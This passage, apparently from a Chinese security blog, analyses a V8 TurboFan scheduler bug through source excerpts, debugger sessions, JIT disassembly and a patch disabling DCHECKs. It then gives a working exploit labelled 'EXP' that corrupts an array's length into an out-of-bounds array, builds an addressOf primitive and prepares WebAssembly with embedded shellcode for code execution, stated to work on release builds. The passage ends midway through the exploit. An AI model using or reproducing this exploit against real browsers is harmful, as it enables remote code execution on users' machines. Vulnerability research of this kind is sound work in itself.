<p>这个函数才是将节点真正的添加到block中，之前的流程只是建立了对应表，并没有实际写入。<code>SerializeRPOIntoSchedule</code>函数是确立block的<code>RPO Number</code>，与我们前面所指代的<code>BlockID</code>不一样，前面我们指代的<code>BlockID</code>特指其建立的顺序，即它是按找顺序下来的；而这里的<code>RPO Number</code>才是我们在输出文件中看到的基本块的真正标号<br><img src="https://i.loli.net/2021/07/14/GWyOYoEmqT1PKMN.png" alt="image.png"><br>可以知道这里是按链表顺序来确立<code>RPO</code>的，之前的一系列流程中block之间通过<code>rpo_next()</code>建立了先后的顺序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Serialize the previously computed order as a special reverse-post-order</span><br><span class="line">// numbering for basic blocks into the final schedule.</span><br><span class="line">void SerializeRPOIntoSchedule() &#123;</span><br><span class="line">  int32_t number = 0;</span><br><span class="line">  for (BasicBlock* b = order_; b != nullptr; b = b-&gt;rpo_next()) &#123;</span><br><span class="line">    b-&gt;set_rpo_number(number++);</span><br><span class="line">    schedule_-&gt;rpo_order()-&gt;push_back(b);</span><br><span class="line">  &#125;</span><br><span class="line">  BeyondEndSentinel()-&gt;set_rpo_number(number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   1733   for (NodeVector* nodes : scheduled_nodes_) &#123;</span><br><span class="line">   1734     BasicBlock::Id id = BasicBlock::Id::FromInt(block_num++);</span><br><span class="line">   1735     BasicBlock* block = schedule_-&gt;GetBlockById(id);</span><br><span class="line">   1736     if (nodes) &#123;</span><br><span class="line">   1737       for (Node* node : base::Reversed(*nodes)) &#123;</span><br><span class="line"> ► 1738         schedule_-&gt;AddNode(block, node);</span><br><span class="line">   1739       &#125;</span><br><span class="line">   1740     &#125;</span><br><span class="line">   1741   &#125;</span><br><span class="line">   1742 &#125;</span><br><span class="line">   1743 </span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$62 = 76</span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$63 = &#123;</span><br><span class="line">  index_ = 3</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p block-&gt;rpo_number_</span><br><span class="line">$65 = 4</span><br><span class="line">...............................</span><br><span class="line">pwndbg&gt; p block-&gt;id()       </span><br><span class="line">$66 = &#123;</span><br><span class="line">  index_ = 7</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p node-&gt;id()        </span><br><span class="line">$67 = 469</span><br><span class="line">pwndbg&gt; p block-&gt;rpo_number_</span><br><span class="line">$68 = 5</span><br></pre></td></tr></table></figure>
<p>可以知道，469属于B5，而76属于B4，位于了B5的前面，这与我们看到的结果吻合<br><img src="https://i.loli.net/2021/07/14/rs4xkDUfXpJE7RC.png" alt="image.png"></p>
<h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>由此，我们漏洞原理已经搞清楚了，还有几个地方需要解决。为什么在第一次大量循环触发优化以后，还需要再来第二次大量循环触发优化，opt函数中为什么要弄一个分支？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function opt(arg1,arg2) &#123;</span><br><span class="line">   if (arg2 == 666) &#123;</span><br><span class="line">      return 666;</span><br><span class="line">   &#125;</span><br><span class="line">   .............</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;10000;i++) &#123;</span><br><span class="line">   opt(A,0);</span><br><span class="line">   opt(B,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;5000;i++) &#123;</span><br><span class="line">   opt(A,666);</span><br><span class="line">   opt(B,666);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过测试和经验，发现当代码中存在这种<code>Unreachable</code>节点时，优化的函数不会被触发到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function opt(arg) &#123;</span><br><span class="line">   arr[0] = 4.4;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1.1,2.2,3.3];</span><br><span class="line">for (var i=0;i&lt;10000;i++) &#123;</span><br><span class="line">   opt(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr = [1.1,2.2,3.3];</span><br><span class="line">%SystemBreak();</span><br><span class="line">opt(arr);</span><br></pre></td></tr></table></figure>
<p>为了能够触发到优化的函数，使用分支来欺骗编译器的deoptimization反馈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function opt(arg,arg2) &#123;</span><br><span class="line">   if (arg2 == 666) &#123;</span><br><span class="line">      return 666;</span><br><span class="line">   &#125;</span><br><span class="line">   arr[0] = 4.4;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1.1,2.2,3.3];</span><br><span class="line">for (var i=0;i&lt;10000;i++) &#123;</span><br><span class="line">   opt(arr,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;5000;i++) &#123;</span><br><span class="line">   opt(arr,666);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr = [1.1,2.2,3.3];</span><br><span class="line">%SystemBreak();</span><br><span class="line">opt(arr);</span><br></pre></td></tr></table></figure>
<p>这样以后发现在gdb中能够成功在JIT代码处断点断下<br><img src="https://i.loli.net/2021/07/14/QNU2ywqYldnRJcz.png" alt="image.png"><br>有了这个小trick以后，我们就可以构造OOB数组了，首先让opt函数优化处理对象，优化后的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">..........................................................</span><br><span class="line">0x3d35000847e5    e5  41c7400bfeffffff movl [r8+0xb],0xfffffffe</span><br><span class="line">0x3d35000847ed    ed  4c8b5de0       REX.W movq r11,[rbp-0x20]</span><br><span class="line">0x3d35000847f1    f1  458b63ff       movl r12,[r11-0x1]</span><br><span class="line">0x3d35000847f5    f5  4c8b15c7ffffff REX.W movq r10,[rip+0xffffffc7]</span><br><span class="line">0x3d35000847fc    fc  4d39e2         REX.W cmpq r10,r12</span><br><span class="line">0x3d35000847ff    ff  7312           jnc 0x3d3500084813  &lt;+0x113&gt;</span><br><span class="line">0x3d3500084801   101  488b15caffffff REX.W movq rdx,[rip+0xffffffca]</span><br><span class="line">0x3d3500084808   108  4c8b1509ffffff REX.W movq r10,[rip+0xffffff09]</span><br><span class="line">0x3d350008480f   10f  41ffd2         call r10</span><br><span class="line">0x3d3500084812   112  cc             int3l</span><br><span class="line">0x3d3500084813   113  41bee1042808   movl r14,0x82804e1      ;; (compressed) object: 0x3d35082804e1 &lt;Map(UINT8ELEMENTS)&gt;</span><br><span class="line">0x3d3500084819   119  4539e6         cmpl r14,r12</span><br><span class="line">0x3d350008481c   11c  0f85a0000000   jnz 0x3d35000848c2  &lt;+0x1c2&gt;</span><br><span class="line">0x3d3500084822   122  49bc692e2508353d0000 REX.W movq r12,0x3d3508252e69    ;; object: 0x3d3508252e69 &lt;HeapNumber 4294967296.0&gt;</span><br><span class="line">0x3d350008482c   12c  41f6c401       testb r12,0x1</span><br><span class="line">0x3d3500084830   130  0f8598000000   jnz 0x3d35000848ce  &lt;+0x1ce&gt;</span><br><span class="line">0x3d3500084836   136  cc             int3l</span><br><span class="line">0x3d3500084837   137  41bca9502808   movl r12,0x82850a9      ;; (compressed) object: 0x3d35082850a9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line">0x3d350008483d   13d  453be1         cmpl r12,r9</span><br><span class="line">0x3d3500084840   140  0f8420000000   jz 0x3d3500084866  &lt;+0x166&gt;</span><br><span class="line">0x3d3500084846   146  e90f000000     jmp 0x3d350008485a  &lt;+0x15a&gt;</span><br><span class="line">0x3d350008484b   14b  41bce14f2808   movl r12,0x8284fe1      ;; (compressed) object: 0x3d3508284fe1 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line">0x3d3500084851   151  453be1         cmpl r12,r9</span><br><span class="line">......................................................</span><br></pre></td></tr></table></figure>
<p>可以看到，先执行了<code>movl [r8+0xb],0xfffffffe</code>，后面才是类型检查，而对于数组对象<code>0xb</code>处正好是<code>length</code>，该字段被修改为负数，因此构造了一个OOB数组。后续就可以很方便利用了。本文为了便于调试，我们将某些DCHECK注释掉了，如下是patch</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/backend/code-generator.cc b/src/compiler/backend/code-generator.cc</span><br><span class="line">index a441a36496..02ae7c7d23 100644</span><br><span class="line">--- a/src/compiler/backend/code-generator.cc</span><br><span class="line">+++ b/src/compiler/backend/code-generator.cc</span><br><span class="line">@@ -701,10 +701,10 @@ CodeGenerator::CodeGenResult CodeGenerator::AssembleInstruction(</span><br><span class="line">   if (adjust_stack) AssembleTailCallBeforeGap(instr, first_unused_stack_slot);</span><br><span class="line">   AssembleGaps(instr);</span><br><span class="line">   if (adjust_stack) AssembleTailCallAfterGap(instr, first_unused_stack_slot);</span><br><span class="line">-  DCHECK_IMPLIES(</span><br><span class="line">+  /*DCHECK_IMPLIES(</span><br><span class="line">       block-&gt;must_deconstruct_frame(),</span><br><span class="line">       instr != instructions()-&gt;InstructionAt(block-&gt;last_instruction_index()) ||</span><br><span class="line">-          instr-&gt;IsRet() || instr-&gt;IsJump());</span><br><span class="line">+          instr-&gt;IsRet() || instr-&gt;IsJump());*/</span><br><span class="line">   if (instr-&gt;IsJump() &amp;&amp; block-&gt;must_deconstruct_frame()) &#123;</span><br><span class="line">     AssembleDeconstructFrame();</span><br><span class="line">   &#125;</span><br><span class="line">diff --git a/src/compiler/backend/frame-elider.cc b/src/compiler/backend/frame-elider.cc</span><br><span class="line">index 293fc9352c..1d50bb5dd2 100644</span><br><span class="line">--- a/src/compiler/backend/frame-elider.cc</span><br><span class="line">+++ b/src/compiler/backend/frame-elider.cc</span><br><span class="line">@@ -49,7 +49,7 @@ void FrameElider::MarkDeConstruction() &#123;</span><br><span class="line">       // deconstructions.</span><br><span class="line">       for (RpoNumber&amp; succ : block-&gt;successors()) &#123;</span><br><span class="line">         if (!InstructionBlockAt(succ)-&gt;needs_frame()) &#123;</span><br><span class="line">-          DCHECK_EQ(1U, block-&gt;SuccessorCount());</span><br><span class="line">+          //DCHECK_EQ(1U, block-&gt;SuccessorCount());</span><br><span class="line">           const Instruction* last =</span><br><span class="line">               InstructionAt(block-&gt;last_instruction_index());</span><br><span class="line">           if (last-&gt;IsThrow() || last-&gt;IsTailCall() ||</span><br><span class="line">@@ -59,7 +59,7 @@ void FrameElider::MarkDeConstruction() &#123;</span><br><span class="line">             continue;</span><br><span class="line">           &#125;</span><br><span class="line">           // The only cases when we need to deconstruct are ret and jump.</span><br><span class="line">-          DCHECK(last-&gt;IsRet() || last-&gt;IsJump());</span><br><span class="line">+          //DCHECK(last-&gt;IsRet() || last-&gt;IsJump());</span><br><span class="line">           block-&gt;mark_must_deconstruct_frame();</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">diff --git a/src/compiler/backend/instruction.cc b/src/compiler/backend/instruction.cc</span><br><span class="line">index f4c09a7cf4..5b5cc27924 100644</span><br><span class="line">--- a/src/compiler/backend/instruction.cc</span><br><span class="line">+++ b/src/compiler/backend/instruction.cc</span><br><span class="line">@@ -700,12 +700,12 @@ void InstructionSequence::ValidateEdgeSplitForm() const &#123;</span><br><span class="line">   // has an edge to a block (== a successor) with more than one predecessors.</span><br><span class="line">   for (const InstructionBlock* block : instruction_blocks()) &#123;</span><br><span class="line">     if (block-&gt;SuccessorCount() &gt; 1) &#123;</span><br><span class="line">-      for (const RpoNumber&amp; successor_id : block-&gt;successors()) &#123;</span><br><span class="line">-        const InstructionBlock* successor = InstructionBlockAt(successor_id);</span><br><span class="line">-        // Expect precisely one predecessor: &quot;block&quot;.</span><br><span class="line">+      /*for (const RpoNumber&amp; successor_id : block-&gt;successors()) &#123;</span><br><span class="line">+        //const InstructionBlock* successor = InstructionBlockAt(successor_id);</span><br><span class="line">+        //Expect precisely one predecessor: &quot;block&quot;.</span><br><span class="line">         CHECK(successor-&gt;PredecessorCount() == 1 &amp;&amp;</span><br><span class="line">               successor-&gt;predecessors()[0] == block-&gt;rpo_number());</span><br><span class="line">-      &#125;</span><br><span class="line">+      &#125;*/</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">diff --git a/src/compiler/dead-code-elimination.cc b/src/compiler/dead-code-elimination.cc</span><br><span class="line">index f39e6cabfb..4ec7703947 100644</span><br><span class="line">--- a/src/compiler/dead-code-elimination.cc</span><br><span class="line">+++ b/src/compiler/dead-code-elimination.cc</span><br><span class="line">@@ -317,7 +317,7 @@ Reduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(</span><br><span class="line">          node-&gt;opcode() == IrOpcode::kTailCall);</span><br><span class="line">   Reduction reduction = PropagateDeadControl(node);</span><br><span class="line">   if (reduction.Changed()) return reduction;</span><br><span class="line">-  if (FindDeadInput(node) != nullptr) &#123;</span><br><span class="line">+  if (node-&gt;opcode() != IrOpcode::kTerminate &amp;&amp; FindDeadInput(node) != nullptr) &#123;</span><br><span class="line">     Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">     Node* control = NodeProperties::GetControlInput(node, 0);</span><br><span class="line">     if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;</span><br><span class="line">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span><br><span class="line">index e7285f0074..8d157c1eba 100644</span><br><span class="line">--- a/src/compiler/pipeline.cc</span><br><span class="line">+++ b/src/compiler/pipeline.cc</span><br><span class="line">@@ -815,7 +815,7 @@ void TraceScheduleAndVerify(OptimizedCompilationInfo* info, PipelineData* data,</span><br><span class="line">     os &lt;&lt; &quot;-- Schedule --------------------------------------\n&quot; &lt;&lt; *schedule;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  if (FLAG_turbo_verify) ScheduleVerifier::Run(schedule);</span><br><span class="line">+  //if (FLAG_turbo_verify) ScheduleVerifier::Run(schedule);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> class SourcePositionWrapper final : public Reducer &#123;</span><br><span class="line">diff --git a/src/compiler/schedule.cc b/src/compiler/schedule.cc</span><br><span class="line">index 8bdcef511b..a232867d5c 100644</span><br><span class="line">--- a/src/compiler/schedule.cc</span><br><span class="line">+++ b/src/compiler/schedule.cc</span><br><span class="line">@@ -253,7 +253,7 @@ void Schedule::AddCall(BasicBlock* block, Node* call, BasicBlock* success_block,</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddBranch(BasicBlock* block, Node* branch, BasicBlock* tblock,</span><br><span class="line">                          BasicBlock* fblock) &#123;</span><br><span class="line">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span><br><span class="line">+  //DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span><br><span class="line">   DCHECK_EQ(IrOpcode::kBranch, branch-&gt;opcode());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kBranch);</span><br><span class="line">   AddSuccessor(block, tblock);</span><br><span class="line">@@ -294,7 +294,7 @@ void Schedule::AddDeoptimize(BasicBlock* block, Node* input) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Schedule::AddThrow(BasicBlock* block, Node* input) &#123;</span><br><span class="line">-  DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span><br><span class="line">+  //DCHECK_EQ(BasicBlock::kNone, block-&gt;control());</span><br><span class="line">   block-&gt;set_control(BasicBlock::kThrow);</span><br><span class="line">   SetControlInput(block, input);</span><br><span class="line">   if (block != end()) AddSuccessor(block, end());</span><br><span class="line">diff --git a/src/compiler/scheduler.cc b/src/compiler/scheduler.cc</span><br><span class="line">index 0b0a548411..4eff63eb4c 100644</span><br><span class="line">--- a/src/compiler/scheduler.cc</span><br><span class="line">+++ b/src/compiler/scheduler.cc</span><br><span class="line">@@ -1418,7 +1418,7 @@ class ScheduleLateNodeVisitor &#123;</span><br><span class="line"> </span><br><span class="line">     // The schedule early block dominates the schedule late block.</span><br><span class="line">     BasicBlock* min_block = scheduler_-&gt;GetData(node)-&gt;minimum_block_;</span><br><span class="line">-    DCHECK_EQ(min_block, BasicBlock::GetCommonDominator(block, min_block));</span><br><span class="line">+    //DCHECK_EQ(min_block, BasicBlock::GetCommonDominator(block, min_block));</span><br><span class="line">     TRACE(</span><br><span class="line">         &quot;Schedule late of #%d:%s is id:%d at loop depth %d, minimum = id:%d\n&quot;,</span><br><span class="line">         node-&gt;id(), node-&gt;op()-&gt;mnemonic(), block-&gt;id().ToInt(),</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于release版本中不存在DCHECK，因此该漏洞可以直接在release版本中被利用<br>EXP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class classA &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.val = 0x4242;</span><br><span class="line">    this.x = 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class classB &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.val = 0x4141;</span><br><span class="line">    this.x = &quot;AAA&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var A = new classA();</span><br><span class="line">var B = new classB();</span><br><span class="line"></span><br><span class="line">function opt(arg1,arg2) &#123;</span><br><span class="line">   if (arg2 == 666) &#123;</span><br><span class="line">      return 666;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   arg1.val = -1;</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (badbeef + a + b + c*d) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                await 666;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;20000;i++) &#123;</span><br><span class="line">   opt(A,0);</span><br><span class="line">   opt(B,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;10000;i++) &#123;</span><br><span class="line">   opt(A,666);</span><br><span class="line">   opt(B,666);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var oob = [1.1,2.2,3.3];</span><br><span class="line">var obj_arr = [&#123;&#125;];</span><br><span class="line">var float64arr = new Float64Array(1.1,2.2);</span><br><span class="line">var arr_buf = new ArrayBuffer(0x10);</span><br><span class="line">opt(oob,0);</span><br><span class="line"></span><br><span class="line">print(&quot;[+] oob length=&quot; + oob.length);</span><br><span class="line">var compression_high = u64f(oob[0x19]) &amp; 0xffffffff00000000n;</span><br><span class="line">print(&quot;[+] compression_high=0x&quot; + compression_high.toString(16));</span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   obj_arr[0] = obj;</span><br><span class="line">   return compression_high + ((u64f(oob[0x6]) - 0x1n) &amp; 0xffffffffn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new 